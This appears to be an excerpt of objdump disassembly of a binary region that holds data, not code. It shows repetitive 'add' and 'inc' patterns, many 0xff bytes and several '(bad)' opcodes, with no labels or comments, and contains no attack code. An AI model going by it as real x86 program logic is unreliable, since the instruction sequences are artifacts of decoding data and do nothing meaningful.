  44f161:	add    bh,bh
  44f163:	add    BYTE PTR [eax],al
  44f165:	add    bh,bh
  44f167:	add    BYTE PTR [eax],al
  44f169:	add    bh,bh
  44f16b:	add    BYTE PTR [eax],al
  44f16d:	add    bh,bh
  44f16f:	add    BYTE PTR [eax],al
  44f171:	add    bh,bh
  44f173:	add    BYTE PTR [eax],al
  44f175:	add    bh,bh
  44f177:	add    BYTE PTR [eax],al
  44f179:	add    bh,bh
  44f17b:	add    BYTE PTR [eax],al
  44f17d:	add    bh,bh
  44f17f:	add    BYTE PTR [eax],al
  44f181:	add    bh,bh
  44f183:	add    BYTE PTR [eax],al
  44f185:	add    bh,bh
  44f187:	add    BYTE PTR [eax],al
  44f189:	add    bh,bh
  44f18b:	add    BYTE PTR [eax],al
  44f18d:	add    dh,bh
  44f18f:	add    BYTE PTR [eax],al
  44f191:	add    BYTE PTR [ebx+0x26000000],ch
	...
  44f317:	sub    BYTE PTR [eax],al
  44f319:	add    BYTE PTR [eax],al
  44f31b:	and    BYTE PTR [eax],al
  44f31d:	add    BYTE PTR [eax],al
  44f31f:	inc    eax
  44f320:	add    BYTE PTR [eax],al
  44f322:	add    BYTE PTR [ecx],al
  44f324:	add    BYTE PTR [eax],ah
  44f326:	add    BYTE PTR [eax],al
  44f328:	add    BYTE PTR [eax],al
  44f32a:	add    BYTE PTR [eax+0x10],al
	...
  44f340:	add    BYTE PTR [eax],ch
  44f342:	cmp    DWORD PTR [eax],eax
  44f344:	add    BYTE PTR [eax],ch
  44f346:	jecxz  0x44f348
  44f348:	add    BYTE PTR [edi],ah
  44f34a:	inc    DWORD PTR [eax]
  44f34c:	add    BYTE PTR [ecx],ch
  44f34e:	inc    DWORD PTR [eax]
  44f350:	add    BYTE PTR [esi],ch
  44f352:	inc    DWORD PTR [eax]
  44f354:	add    BYTE PTR [esi],ch
  44f356:	inc    DWORD PTR [eax]
  44f358:	add    BYTE PTR [ebx],dh
  44f35a:	inc    DWORD PTR [eax]
  44f35c:	add    BYTE PTR [edi+edi*8],dh
  44f35f:	add    BYTE PTR [eax],al
  44f361:	xor    bh,bh
  44f363:	add    BYTE PTR [eax],al
  44f365:	cmp    bh,bh
  44f367:	add    BYTE PTR [eax],al
  44f369:	cmp    bh,bh
  44f36b:	add    BYTE PTR [eax],al
  44f36d:	cmp    edi,edi
  44f36f:	add    BYTE PTR [eax],al
  44f371:	cmp    bh,bh
  44f373:	add    BYTE PTR [eax],al
  44f375:	cmp    edi,edi
  44f377:	add    BYTE PTR [eax],al
  44f379:	inc    DWORD PTR ds:[eax]
  44f37c:	add    BYTE PTR [edi],bh
  44f37e:	inc    DWORD PTR [eax]
  44f380:	add    BYTE PTR [edi],bh
  44f382:	inc    DWORD PTR [eax]
  44f384:	add    BYTE PTR [edi],bh
  44f386:	inc    DWORD PTR [eax]
  44f388:	add    BYTE PTR [eax-0x1],cl
  44f38b:	add    BYTE PTR [eax],al
  44f38d:	inc    DWORD PTR ds:[eax]
  44f390:	add    BYTE PTR [edi+edi*8],bh
  44f393:	add    BYTE PTR [eax],al
  44f395:	cmp    edi,edi
  44f397:	add    BYTE PTR [eax],al
  44f399:	cmp    al,0xff
  44f39b:	add    BYTE PTR [eax],al
  44f39d:	xor    eax,0x320000ff
  44f3a2:	inc    DWORD PTR [eax]
  44f3a4:	add    BYTE PTR [ecx],dh
  44f3a6:	inc    DWORD PTR [eax]
  44f3a8:	add    BYTE PTR [edi+edi*8],dh
  44f3ab:	add    BYTE PTR [eax],al
  44f3ad:	cmp    bh,bh
  44f3af:	add    BYTE PTR [eax],al
  44f3b1:	cmp    bh,bh
  44f3b3:	add    BYTE PTR [eax],al
  44f3b5:	inc    DWORD PTR ss:[eax]
  44f3b8:	add    BYTE PTR ds:0x260000f2,ah
  44f3be:	dec    edi
  44f3bf:	add    BYTE PTR [eax],al
  44f3c1:	sub    edi,edx
  44f3c3:	add    BYTE PTR [eax],al
  44f3c5:	sub    edi,edi
  44f3c7:	add    BYTE PTR [eax],al
  44f3c9:	sub    edi,edi
  44f3cb:	add    BYTE PTR [eax],al
  44f3cd:	daa    
  44f3ce:	inc    DWORD PTR [eax]
  44f3d0:	add    BYTE PTR [edi+edi*8],ch
  44f3d3:	add    BYTE PTR [eax],al
  44f3d5:	xor    edi,edi
  44f3d7:	add    BYTE PTR [eax],al
  44f3d9:	inc    eax
  44f3da:	inc    DWORD PTR [eax]
  44f3dc:	add    BYTE PTR [ecx],bh
  44f3de:	inc    DWORD PTR [eax]
  44f3e0:	add    BYTE PTR [edx],bh
  44f3e2:	inc    DWORD PTR [eax]
  44f3e4:	add    BYTE PTR [eax-0x1],al
  44f3e7:	add    BYTE PTR [eax],al
  44f3e9:	inc    ebp
  44f3ea:	inc    DWORD PTR [eax]
  44f3ec:	add    BYTE PTR [edi+edi*8+0x0],al
  44f3f0:	add    BYTE PTR [edi+edi*8],bh
  44f3f3:	add    BYTE PTR [eax],al
  44f3f5:	inc    ecx
  44f3f6:	inc    DWORD PTR [eax]
  44f3f8:	add    BYTE PTR [edx-0x1],al
  44f3fb:	add    BYTE PTR [eax],al
  44f3fd:	inc    edx
  44f3fe:	inc    DWORD PTR [eax]
  44f400:	add    BYTE PTR [ebx-0x1],al
  44f403:	add    BYTE PTR [eax],al
  44f405:	inc    edx
  44f406:	inc    DWORD PTR [eax]
  44f408:	add    BYTE PTR [ecx-0x1],dl
  44f40b:	add    BYTE PTR [eax],al
  44f40d:	dec    edi
  44f40e:	inc    DWORD PTR [eax]
  44f410:	add    BYTE PTR [ebp-0x1],al
  44f413:	add    BYTE PTR [eax],al
  44f415:	aas    
  44f416:	inc    DWORD PTR [eax]
  44f418:	add    BYTE PTR [ecx-0x1],al
  44f41b:	add    BYTE PTR [eax],al
  44f41d:	cmp    al,0xff
  44f41f:	add    BYTE PTR [eax],al
  44f421:	cmp    al,0xff
  44f423:	add    BYTE PTR [eax],al
  44f425:	cmp    eax,0x3a0000ff
  44f42a:	inc    DWORD PTR [eax]
  44f42c:	add    BYTE PTR [edx],bh
  44f42e:	inc    DWORD PTR [eax]
  44f430:	add    BYTE PTR [edx],bh
  44f432:	inc    DWORD PTR [eax]
  44f434:	add    BYTE PTR [eax],bh
  44f436:	inc    DWORD PTR [eax]
  44f438:	add    BYTE PTR [edi],dh
  44f43a:	inc    DWORD PTR [eax]
  44f43c:	add    BYTE PTR ds:0x220304ee,ah
  44f442:	std    
  44f443:	add    BYTE PTR [eax],al
  44f445:	sub    edi,edi
  44f447:	add    BYTE PTR [eax],al
  44f449:	inc    DWORD PTR cs:[eax]
  44f44c:	add    BYTE PTR ds:0x300000ff,ch
  44f452:	inc    DWORD PTR [eax]
  44f454:	add    BYTE PTR [edx],dh
  44f456:	inc    DWORD PTR [eax]
  44f458:	add    BYTE PTR [esi],dh
  44f45a:	inc    DWORD PTR [eax]
  44f45c:	add    BYTE PTR [esi],dh
  44f45e:	inc    DWORD PTR [eax]
  44f460:	add    BYTE PTR [esi],dh
  44f462:	inc    DWORD PTR [eax]
  44f464:	add    BYTE PTR [ecx],bh
  44f466:	inc    DWORD PTR [eax]
  44f468:	add    BYTE PTR [ebx],bh
  44f46a:	inc    DWORD PTR [eax]
  44f46c:	add    BYTE PTR [ecx-0x1],al
  44f46f:	add    BYTE PTR [eax],al
  44f471:	aas    
  44f472:	inc    DWORD PTR [eax]
  44f474:	add    BYTE PTR [ecx-0x1],al
  44f477:	add    BYTE PTR [eax],al
  44f479:	inc    esi
  44f47a:	inc    DWORD PTR [eax]
  44f47c:	add    BYTE PTR [ecx-0x1],cl
  44f47f:	add    BYTE PTR [eax],al
  44f481:	dec    ecx
  44f482:	inc    DWORD PTR [eax]
  44f484:	add    BYTE PTR [edi+edi*8+0x0],cl
  44f488:	add    BYTE PTR [ecx-0x1],dl
  44f48b:	add    BYTE PTR [eax],al
  44f48d:	inc    esi
  44f48e:	inc    DWORD PTR [eax]
  44f490:	add    BYTE PTR [eax-0x1],al
  44f493:	add    BYTE PTR [eax],al
  44f495:	inc    esp
  44f496:	inc    DWORD PTR [eax]
  44f498:	add    BYTE PTR [eax-0x1],al
  44f49b:	add    BYTE PTR [eax],al
  44f49d:	inc    edx
  44f49e:	inc    DWORD PTR [eax]
  44f4a0:	add    BYTE PTR [edi+edi*8],bh
  44f4a3:	add    BYTE PTR [eax],al
  44f4a5:	cmp    eax,0x3c0000ff
  44f4aa:	inc    DWORD PTR [eax]
  44f4ac:	add    BYTE PTR [edi],dh
  44f4ae:	inc    DWORD PTR [eax]
  44f4b0:	add    BYTE PTR [edi+edi*8],dh
  44f4b3:	add    BYTE PTR [eax],al
  44f4b5:	xor    al,0xff
  44f4b7:	add    BYTE PTR [eax],al
  44f4b9:	xor    eax,0x270000ff
  44f4be:	inc    DWORD PTR [eax]
  44f4c0:	add    BYTE PTR ds:0x240000ff,bl
  44f4c6:	inc    DWORD PTR [eax]
  44f4c8:	add    BYTE PTR [edi],ah
  44f4ca:	inc    DWORD PTR [eax]
  44f4cc:	add    BYTE PTR [eax],ch
  44f4ce:	inc    DWORD PTR [eax]
  44f4d0:	add    BYTE PTR [edi+edi*8],ch
  44f4d3:	add    BYTE PTR [eax],al
  44f4d5:	xor    bh,bh
  44f4d7:	add    BYTE PTR [eax],al
  44f4d9:	xor    edi,edi
  44f4db:	add    BYTE PTR [eax],al
  44f4dd:	xor    edi,edi
  44f4df:	add    BYTE PTR [eax],al
  44f4e1:	xor    eax,0x390000ff
  44f4e6:	inc    DWORD PTR [eax]
  44f4e8:	add    BYTE PTR [edi+edi*8],dh
  44f4eb:	add    BYTE PTR [eax],al
  44f4ed:	cmp    eax,0x3a0000ff
  44f4f2:	inc    DWORD PTR [eax]
  44f4f4:	add    BYTE PTR ds:0x440000ff,bh
  44f4fa:	inc    DWORD PTR [eax]
  44f4fc:	add    BYTE PTR [ebx-0x1],cl
  44f4ff:	add    BYTE PTR [eax],al
  44f501:	dec    esi
  44f502:	inc    DWORD PTR [eax]
  44f504:	add    BYTE PTR [edx-0x1],dl
  44f507:	add    BYTE PTR [eax],al
  44f509:	dec    edi
  44f50a:	inc    DWORD PTR [eax]
  44f50c:	add    BYTE PTR [edi-0x1],al
  44f50f:	add    BYTE PTR [eax],al
  44f511:	inc    edx
  44f512:	inc    DWORD PTR [eax]
  44f514:	add    BYTE PTR [edx-0x1],al
  44f517:	add    BYTE PTR [eax],al
  44f519:	aas    
  44f51a:	inc    DWORD PTR [eax]
  44f51c:	add    BYTE PTR [ecx-0x1],al
  44f51f:	add    BYTE PTR [eax],al
  44f521:	cmp    al,0xff
  44f523:	add    BYTE PTR [eax],al
  44f525:	cmp    bh,bh
  44f527:	add    BYTE PTR [eax],al
  44f529:	xor    eax,0x310000ff
  44f52e:	inc    DWORD PTR [eax]
  44f530:	add    BYTE PTR [ecx],dh
  44f532:	inc    DWORD PTR [eax]
  44f534:	add    BYTE PTR [edx],dh
  44f536:	inc    DWORD PTR [eax]
  44f538:	add    BYTE PTR [edi],ch
  44f53a:	inc    DWORD PTR [eax]
  44f53c:	add    BYTE PTR [eax],ch
  44f53e:	inc    DWORD PTR [eax]
  44f540:	add    BYTE PTR [edi],bl
  44f542:	inc    DWORD PTR [eax]
  44f544:	add    BYTE PTR [edi],ah
  44f546:	inc    DWORD PTR [eax]
  44f548:	add    BYTE PTR [edx],ch
  44f54a:	inc    DWORD PTR [eax]
  44f54c:	add    BYTE PTR [edx],ch
  44f54e:	inc    DWORD PTR [eax]
  44f550:	add    BYTE PTR [edi],ch
  44f552:	inc    DWORD PTR [eax]
  44f554:	add    BYTE PTR [eax],dh
  44f556:	inc    DWORD PTR [eax]
  44f558:	add    BYTE PTR ds:0x340000ff,dh
  44f55e:	inc    DWORD PTR [eax]
  44f560:	add    BYTE PTR [esi],ch
  44f562:	inc    DWORD PTR [eax]
  44f564:	add    BYTE PTR [esi],ch
  44f566:	inc    DWORD PTR [eax]
  44f568:	add    BYTE PTR [ebx],bh
  44f56a:	inc    DWORD PTR [eax]
  44f56c:	add    BYTE PTR [eax],bh
  44f56e:	inc    DWORD PTR [eax]
  44f570:	add    BYTE PTR [ebx],bh
  44f572:	inc    DWORD PTR [eax]
  44f574:	add    BYTE PTR [ebx-0x1],al
  44f577:	add    BYTE PTR [eax],al
  44f579:	inc    edi
  44f57a:	inc    DWORD PTR [eax]
  44f57c:	add    BYTE PTR [edi-0x1],al
  44f57f:	add    BYTE PTR [eax],al
  44f581:	inc    ebp
  44f582:	inc    DWORD PTR [eax]
  44f584:	add    BYTE PTR [edx-0x1],cl
  44f587:	add    BYTE PTR [eax],al
  44f589:	dec    ebp
  44f58a:	inc    DWORD PTR [eax]
  44f58c:	add    BYTE PTR [eax-0x1],cl
  44f58f:	add    BYTE PTR [eax],al
  44f591:	inc    ebp
  44f592:	inc    DWORD PTR [eax]
  44f594:	add    BYTE PTR [edi],bh
  44f596:	inc    DWORD PTR [eax]
  44f598:	add    BYTE PTR [ecx-0x1],al
  44f59b:	add    BYTE PTR [eax],al
  44f59d:	inc    eax
  44f59e:	inc    DWORD PTR [eax]
  44f5a0:	add    BYTE PTR [esi],bh
  44f5a2:	inc    DWORD PTR [eax]
  44f5a4:	add    BYTE PTR [eax],bh
  44f5a6:	inc    DWORD PTR [eax]
  44f5a8:	add    BYTE PTR [ecx],dh
  44f5aa:	inc    DWORD PTR [eax]
  44f5ac:	add    BYTE PTR [ebx],dh
  44f5ae:	inc    DWORD PTR [eax]
  44f5b0:	add    BYTE PTR [edx],dh
  44f5b2:	inc    DWORD PTR [eax]
  44f5b4:	add    BYTE PTR [eax],dh
  44f5b6:	inc    DWORD PTR [eax]
  44f5b8:	add    BYTE PTR [edi+edi*8],ch
  44f5bb:	add    BYTE PTR [eax],al
  44f5bd:	and    eax,0x1e0000ff
  44f5c2:	inc    DWORD PTR [eax]
  44f5c4:	add    BYTE PTR [edi+edi*8],ah
  44f5c7:	add    BYTE PTR [eax],al
  44f5c9:	inc    DWORD PTR es:[eax]
  44f5cc:	add    BYTE PTR [edi],ah
  44f5ce:	inc    DWORD PTR [eax]
  44f5d0:	add    BYTE PTR ds:0x2e0000ff,ch
  44f5d6:	inc    DWORD PTR [eax]
  44f5d8:	add    BYTE PTR ds:0x350000ff,dh
  44f5de:	inc    DWORD PTR [eax]
  44f5e0:	add    BYTE PTR [ebx],dh
  44f5e2:	inc    DWORD PTR [eax]
  44f5e4:	add    BYTE PTR [ecx],bh
  44f5e6:	inc    DWORD PTR [eax]
  44f5e8:	add    BYTE PTR [esi],bh
  44f5ea:	inc    DWORD PTR [eax]
  44f5ec:	add    BYTE PTR [edx],bh
  44f5ee:	inc    DWORD PTR [eax]
  44f5f0:	add    BYTE PTR [ecx-0x1],al
  44f5f3:	add    BYTE PTR [eax],al
  44f5f5:	inc    ebx
  44f5f6:	inc    DWORD PTR [eax]
  44f5f8:	add    BYTE PTR [eax-0x1],al
  44f5fb:	add    BYTE PTR [eax],al
  44f5fd:	inc    eax
  44f5fe:	inc    DWORD PTR [eax]
  44f600:	add    BYTE PTR [edi],bh
  44f602:	inc    DWORD PTR [eax]
  44f604:	add    BYTE PTR [edx-0x1],al
  44f607:	add    BYTE PTR [eax],al
  44f609:	inc    edi
  44f60a:	inc    DWORD PTR [eax]
  44f60c:	add    BYTE PTR [ebx-0x1],al
  44f60f:	add    BYTE PTR [eax],al
  44f611:	inc    ebp
  44f612:	inc    DWORD PTR [eax]
  44f614:	add    BYTE PTR [eax-0x1],al
  44f617:	add    BYTE PTR [eax],al
  44f619:	cmp    al,0xff
  44f61b:	add    BYTE PTR [eax],al
  44f61d:	cmp    edi,edi
  44f61f:	add    BYTE PTR [eax],al
  44f621:	cmp    bh,bh
  44f623:	add    BYTE PTR [eax],al
  44f625:	xor    eax,0x360000ff
  44f62a:	inc    DWORD PTR [eax]
  44f62c:	add    BYTE PTR [ecx],dh
  44f62e:	inc    DWORD PTR [eax]
  44f630:	add    BYTE PTR [edi],ch
  44f632:	inc    DWORD PTR [eax]
  44f634:	add    BYTE PTR [edi+edi*8],ch
  44f637:	add    BYTE PTR [eax],al
  44f639:	sub    edi,edi
  44f63b:	add    BYTE PTR [eax],al
  44f63d:	and    bh,bh
  44f63f:	add    BYTE PTR [eax],al
  44f641:	and    bh,bh
  44f643:	add    BYTE PTR [eax],al
  44f645:	and    al,0xff
  44f647:	add    BYTE PTR [eax],al
  44f649:	inc    DWORD PTR es:[eax]
  44f64c:	add    BYTE PTR [ecx],ch
  44f64e:	inc    DWORD PTR [eax]
  44f650:	add    BYTE PTR [ebx],ch
  44f652:	inc    DWORD PTR [eax]
  44f654:	add    BYTE PTR ds:0x300000ff,ch
  44f65a:	inc    DWORD PTR [eax]
  44f65c:	add    BYTE PTR [edi+edi*8],dh
  44f65f:	add    BYTE PTR [eax],al
  44f661:	aaa    
  44f662:	inc    DWORD PTR [eax]
  44f664:	add    BYTE PTR [ebx],bh
  44f666:	inc    DWORD PTR [eax]
  44f668:	add    BYTE PTR [esi],bh
  44f66a:	inc    DWORD PTR [eax]
  44f66c:	add    BYTE PTR [esi],bh
  44f66e:	inc    DWORD PTR [eax]
  44f670:	add    BYTE PTR [esi],bh
  44f672:	inc    DWORD PTR [eax]
  44f674:	add    BYTE PTR [edi],bh
  44f676:	inc    DWORD PTR [eax]
  44f678:	add    BYTE PTR [eax],bh
  44f67a:	inc    DWORD PTR [eax]
  44f67c:	add    BYTE PTR [ebx],bh
  44f67e:	inc    DWORD PTR [eax]
  44f680:	add    BYTE PTR [esi],bh
  44f682:	inc    DWORD PTR [eax]
  44f684:	add    BYTE PTR [edi],bh
  44f686:	inc    DWORD PTR [eax]
  44f688:	add    BYTE PTR [edx-0x1],al
  44f68b:	add    BYTE PTR [eax],al
  44f68d:	inc    ecx
  44f68e:	inc    DWORD PTR [eax]
  44f690:	add    BYTE PTR [edx-0x1],al
  44f693:	add    BYTE PTR [eax],al
  44f695:	inc    ecx
  44f696:	inc    DWORD PTR [eax]
  44f698:	add    BYTE PTR ds:0x3a0000ff,bh
  44f69e:	inc    DWORD PTR [eax]
  44f6a0:	add    BYTE PTR [edi],dh
  44f6a2:	inc    DWORD PTR [eax]
  44f6a4:	add    BYTE PTR ds:0x310000ff,dh
  44f6aa:	inc    DWORD PTR [eax]
  44f6ac:	add    BYTE PTR [edi],ch
  44f6ae:	inc    DWORD PTR [eax]
  44f6b0:	add    BYTE PTR ds:0x2c0000ff,ch
  44f6b6:	inc    DWORD PTR [eax]
  44f6b8:	add    BYTE PTR [eax],ch
  44f6ba:	inc    DWORD PTR [eax]
  44f6bc:	add    BYTE PTR [eax],ah
  44f6be:	inc    DWORD PTR [eax]
  44f6c0:	add    BYTE PTR [edi],bl
  44f6c2:	inc    DWORD PTR [eax]
  44f6c4:	add    BYTE PTR [edi],ah
  44f6c6:	inc    DWORD PTR [eax]
  44f6c8:	add    BYTE PTR [edi+edi*8],ah
  44f6cb:	add    BYTE PTR [eax],al
  44f6cd:	and    al,0xff
  44f6cf:	add    eax,DWORD PTR [ebx]
  44f6d1:	add    bh,bh
  44f6d3:	add    al,0x3
  44f6d5:	add    bh,bh
  44f6d7:	add    al,0x3
  44f6d9:	add    bh,bh
  44f6db:	add    al,0x3
  44f6dd:	add    bh,bh
  44f6df:	add    al,0x3
  44f6e1:	add    bh,bh
  44f6e3:	add    al,0x3
  44f6e5:	add    bh,bh
  44f6e7:	add    al,0x3
  44f6e9:	add    bh,bh
  44f6eb:	add    al,0x3
  44f6ed:	add    bh,bh
  44f6ef:	add    al,0x3
  44f6f1:	add    bh,bh
  44f6f3:	add    al,0x3
  44f6f5:	add    bh,bh
  44f6f7:	add    al,0x3
  44f6f9:	add    bh,bh
  44f6fb:	add    DWORD PTR [ecx],eax
  44f6fd:	sbb    al,0xff
  44f6ff:	add    al,0x3
  44f701:	add    bh,bh
  44f703:	add    al,0x3
  44f705:	add    bh,bh
  44f707:	add    al,0x3
  44f709:	add    bh,bh
  44f70b:	add    al,0x3
  44f70d:	add    bh,bh
  44f70f:	add    al,0x3
  44f711:	add    bh,bh
  44f713:	add    al,0x3
  44f715:	add    bh,bh
  44f717:	add    al,0x3
  44f719:	add    bh,bh
  44f71b:	add    al,0x3
  44f71d:	add    bh,bh
  44f71f:	add    al,0x3
  44f721:	add    bh,bh
  44f723:	add    al,0x3
  44f725:	add    bh,bh
  44f727:	add    al,0x3
  44f729:	add    bh,bh
  44f72b:	add    BYTE PTR [eax],al
  44f72d:	or     bh,bh
  44f72f:	add    BYTE PTR [eax],al
  44f731:	sub    bh,bh
  44f733:	add    BYTE PTR [eax],al
  44f735:	sub    bh,bh
  44f737:	add    BYTE PTR [eax],al
  44f739:	and    edi,edi
  44f73b:	add    BYTE PTR [eax],al
  44f73d:	push   ds
  44f73e:	inc    DWORD PTR [eax]
  44f740:	add    BYTE PTR [edi],bl
  44f742:	inc    DWORD PTR [eax]
  44f744:	add    BYTE PTR ds:0x1f0000ff,ah
  44f74a:	inc    DWORD PTR [ecx]
  44f74c:	add    DWORD PTR [eax],ecx
  44f74e:	inc    DWORD PTR [ebx+eax*1]
  44f751:	add    bh,bh
  44f753:	ret    
  44f754:	clc    
  44f755:	bnd call esi
  44f758:	stc    
  44f759:	hlt    
  44f75a:	call   esi
  44f75c:	cli    
  44f75d:	cmc    
  44f75e:	jmp    DWORD PTR [edx]
  44f760:	xor    BYTE PTR [esi-0x1],bh
  44f763:	sub    BYTE PTR [ebp-0x63a0037],0xf3
  44f76a:	(bad)  
  44f76b:	mov    eax,0xc3ffeff3
  44f770:	div    cl
  44f772:	inc    edx
  44f774:	cli    
  44f775:	repnz inc DWORD PTR [ebx+eax*1]
  44f779:	add    bh,bh
  44f77b:	add    BYTE PTR [eax],al
  44f77d:	cmp    bh,bh
  44f77f:	add    al,0x3
  44f781:	add    bh,bh
  44f783:	jnp    0x44f721
  44f785:	xchg   edx,eax
  44f786:	call   eax
  44f788:	lock stc 
  44f78a:	dec    esp
  44f78c:	lock idiv edi
  44f78f:	retf   
  44f790:	lock idiv edi
  44f793:	int3   
  44f794:	lock stc 
  44f796:	call   FWORD PTR [eax-0x4f00283f]
  44f79c:	out    0xec,eax
  44f79e:	call   ebx
  44f7a0:	repnz stc 
  44f7a2:	dec    edi
  44f7a4:	lock stc 
  44f7a6:	inc    esp
  44f7a8:	out    dx,eax
  44f7a9:	clc    
  44f7aa:	inc    DWORD PTR [edx]
  44f7ac:	add    al,BYTE PTR [eax]
  44f7ae:	inc    DWORD PTR [ecx]
  44f7b0:	add    DWORD PTR [ebx],edx
  44f7b2:	inc    DWORD PTR [eax]
  44f7b4:	add    BYTE PTR [edi+edi*8],ah
  44f7b7:	add    BYTE PTR [eax],al
  44f7b9:	and    edi,edi
  44f7bb:	add    BYTE PTR [eax],al
  44f7bd:	sbb    edi,edi
  44f7bf:	add    BYTE PTR [eax],al
  44f7c1:	sbb    al,0xff
  44f7c3:	add    BYTE PTR [eax],al
  44f7c5:	and    bh,bh
  44f7c7:	add    DWORD PTR [ecx],eax
  44f7c9:	ud0    eax,DWORD PTR [ebx+eax*1]
  44f7cd:	add    bh,bh
  44f7cf:	int3   
  44f7d0:	stc    
  44f7d1:	hlt    
  44f7d2:	call   DWORD PTR [ebx-0x45]
  44f7d5:	(bad)  
  44f7d7:	pop    eax
  44f7d8:	mov    ebx,0xcd68ffdb
  44f7dd:	in     eax,0xff
  44f7df:	data16 jns 0x44f78f
  44f7e2:	call   FWORD PTR [esi-0x41]
  44f7e5:	fdivr  st,st(7)
  44f7e7:	dec    esp
  44f7e8:	mov    dl,0xd9
  44f7ea:	call   DWORD PTR [ecx-0x49]
  44f7ed:	(bad)  
  44f7ef:	pop    edi
  44f7f0:	(bad)
  44f7f3:	mov    esi,0x4ffecf0
  44f7f8:	add    eax,DWORD PTR [eax]
  44f7fa:	inc    DWORD PTR [eax]
  44f7fc:	add    BYTE PTR [edi+edi*8],dh
  44f7ff:	add    BYTE PTR [eax],al
  44f801:	inc    DWORD PTR cs:[eax]
  44f804:	add    BYTE PTR [eax],al
  44f806:	inc    DWORD PTR [esp+ebp*4-0x399c0058]
  44f80d:	loopne 0x44f80e
  44f80f:	pusha  
  44f810:	(bad)  
  44f811:	(bad)  
  44f813:	inc    edx
  44f814:	mov    bl,0xd5
  44f816:	(bad)  
  44f817:	cmp    ch,BYTE PTR [edi-0x3d96002a]
  44f81d:	fdiv   st(7),st
  44f81f:	pop    edx
  44f820:	mov    esi,0xc860ffdb
  44f825:	jecxz  0x44f826
  44f827:	retf   
  44f828:	out    dx,al
  44f829:	idiv   edi
  44f82b:	shr    dh,0xf7
  44f82e:	inc    DWORD PTR [edx]
  44f830:	add    al,BYTE PTR [eax]
  44f832:	inc    DWORD PTR [eax]
  44f834:	add    BYTE PTR [ecx],ah
  44f836:	inc    DWORD PTR [eax]
  44f838:	add    BYTE PTR [eax],ah
  44f83a:	inc    DWORD PTR [eax]
  44f83c:	add    BYTE PTR [edx],bl
  44f83e:	inc    DWORD PTR [ecx]
  44f840:	add    DWORD PTR [eax],eax
  44f842:	inc    DWORD PTR [ecx]
  44f844:	add    DWORD PTR [eax],eax
  44f846:	inc    DWORD PTR [ecx]
  44f848:	add    DWORD PTR [eax],eax
  44f84a:	dec    esi
  44f84c:	stc    
  44f84d:	repz jmp DWORD PTR [ecx-0x39]
  44f851:	loope  0x44f852
  44f853:	addr16 int3 
  44f855:	in     al,0xff
  44f857:	addr16 int3 
  44f859:	jecxz  0x44f85a
  44f85b:	imul   esp,DWORD PTR [esp+esi*4+0x644b46ff],0xe4d589ff
  44f866:	dec    DWORD PTR [esi-0x4c]
  44f869:	(bad)  
  44f86b:	pop    ecx
  44f86c:	mov    edi,0xc05dffde
  44f871:	fdivp  st(7),st
  44f873:	shr    esp,0xf1
  44f876:	inc    DWORD PTR [ebx]
  44f878:	or     BYTE PTR ds:0x320000ff,cl
  44f87e:	inc    DWORD PTR [eax]
  44f880:	add    BYTE PTR [eax],bh
  44f882:	inc    DWORD PTR [ecx]
  44f884:	add    DWORD PTR [esi],ecx
  44f886:	inc    DWORD PTR [esp+eax*1]
  44f889:	add    bh,bh
  44f88b:	test   al,0xf1
  44f88d:	(bad)  
  44f88e:	push   DWORD PTR [edx]
  44f890:	test   eax,0xb75bffd5
  44f895:	xlat   BYTE PTR ds:[ebx]
  44f896:	dec    DWORD PTR [ecx-0x56]
  44f899:	sar    edi,cl
  44f89b:	pop    eax
  44f89c:	mov    edi,0xc15dffdd
  44f8a1:	fdiv   st(7),st
  44f8a3:	pop    esp
  44f8a4:	rcr    ah,0xff
  44f8a7:	pop    esp
  44f8a8:	rcr    bl,0xff
  44f8ab:	cdq    
  44f8ac:	fdiv   st,st(0)
  44f8ae:	dec    edx
  44f8b0:	lock idiv edi
  44f8b3:	add    al,0x3
  44f8b5:	add    bh,bh
  44f8b7:	add    BYTE PTR [eax],al
  44f8b9:	sbb    al,0xff
  44f8bb:	add    BYTE PTR [eax],al
  44f8bd:	sbb    bh,bh
  44f8bf:	add    al,0x3
  44f8c1:	add    bh,bh
  44f8c3:	fdiv   st(2),st
  44f8c5:	idiv   bh
  44f8c7:	aam    0xfa
  44f8c9:	hlt    
  44f8ca:	jmp    DWORD PTR [edx-0x38]
  44f8cd:	loope  0x44f8ce
  44f8cf:	ins    BYTE PTR es:[edi],dx
  44f8d0:	shl    ebp,1
  44f8d2:	push   DWORD PTR [eax-0x2c]
  44f8d5:	out    0xff,eax
  44f8d7:	outs   dx,DWORD PTR ds:[esi]
  44f8d8:	shl    ch,cl
  44f8da:	(bad)  
  44f8db:	cmp    dl,BYTE PTR [ebx-0x6b]
  44f8de:	inc    DWORD PTR [esi+0x6b]
  44f8e1:	sahf   
  44f8e2:	inc    DWORD PTR [eax+0x64ffe4c0]
  44f8e8:	mov    edx,0xd17fffd8
  44f8ed:	in     eax,0xff
  44f8ef:	mov    esi,ds
  44f8f1:	out    dx,eax
  44f8f2:	dec    DWORD PTR [esp+ecx*4-0x41]
  44f8f6:	inc    DWORD PTR [eax]
  44f8f8:	add    BYTE PTR ds:0x340000ff,al
  44f8fe:	inc    DWORD PTR [eax]
  44f900:	add    BYTE PTR [edx],dh
  44f902:	inc    DWORD PTR [eax]
  44f904:	add    BYTE PTR [edi+edi*8],dh
  44f907:	add    al,0x4
  44f909:	add    bh,bh
  44f90b:	and    ebx,0xffffffff
  44f90e:	call   DWORD PTR [ecx-0x56]
  44f911:	int    0xff
  44f913:	inc    eax
  44f914:	pop    ebx
  44f916:	inc    DWORD PTR ds:0x8ff0003
  44f91c:	or     cl,BYTE PTR [esi]
  44f91e:	inc    DWORD PTR [ebx+esi*2+0x79]
  44f922:	dec    DWORD PTR [ebx+0x71ffecd8]
  44f928:	leave  
  44f929:	in     al,0xff
  44f92b:	dec    edx
  44f92c:	mov    ecx,0xc561ffda
  44f931:	jmp    0xfa34c335
  44f936:	inc    DWORD PTR [ebx]
  44f938:	add    eax,DWORD PTR [eax]
  44f93a:	inc    DWORD PTR [eax]
  44f93c:	add    BYTE PTR [edi+edi*8],dl
  44f93f:	add    al,0x3
  44f941:	add    bh,bh
  44f943:	iret   
  44f944:	cli    
  44f945:	hlt    
  44f946:	dec    DWORD PTR [edi-0x4d]
  44f949:	(bad)  
  44f94a:	jmp    DWORD PTR [ebp-0x35]
  44f94d:	loope  0x44f94e
  44f94f:	sub    BYTE PTR [ebp-0x4ec90035],bl
  44f955:	fcos   
  44f957:	aas    
  44f958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f959:	(bad)  
  44f95a:	inc    DWORD PTR [esp+eax*1]
  44f95d:	add    bh,bh
  44f95f:	add    al,0x3
  44f961:	add    bh,bh
